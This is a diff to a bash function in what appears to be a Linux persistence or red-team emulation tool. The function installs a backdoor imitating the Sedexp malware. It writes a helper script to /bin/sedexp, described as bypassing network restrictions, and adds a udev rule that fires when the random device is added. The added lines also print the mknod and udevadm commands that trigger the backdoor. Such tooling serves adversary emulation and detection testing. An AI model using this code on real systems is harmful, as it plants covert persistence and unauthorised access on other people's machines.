@@ -22,6 +22,7 @@ setup_udev() {
 		echo "--custom                                Use custom udev settings"
 		echo "  --command <command>                     Specify custom command"
 		echo "  --path <path>                           Specify custom path"
+		echo "--help|-h                               Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -90,7 +91,7 @@ setup_udev() {
 				# Reference: https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp
 
 				# Create a helper program to bypass network restrictions
-				cat <<-EOF > /usr/bin/sedexp
+				cat <<-EOF > /bin/sedexp
 				#!/bin/bash
 				while true; do
 					if [ -f /tmp/sedexp ]; then
@@ -108,8 +109,19 @@ setup_udev() {
 
 				# Create a more widely supported sedexp udev rules file based on Sedexp malware
 				cat <<-EOF > /etc/udev/rules.d/10-sedexp.rules
-				ACTION=="add", KERNEL=="random", RUN+="/usr/bin/touch /tmp/sedexp"
+				ACTION=="add", KERNEL=="random", RUN+="/bin/touch /tmp/sedexp"
 				EOF
+
+				echo "[!] This mechanism is not persistent across reboots."
+				echo "[!] Consider using --at, --cron, or --systemd for persistence."
+				echo "[!] This technique is just here to mimic the sedexp behavior."
+				echo ""
+				echo "[!] Note: This utility launches when a random device is added to the system."
+				echo "[!] You can trigger this backdoor by running:"
+				echo ""
+				echo "sudo mknod /dev/random c 1 8"
+				echo "sudo udevadm trigger --action=add --name-match=random"
+				echo ""
 				;;
 
 			--at )
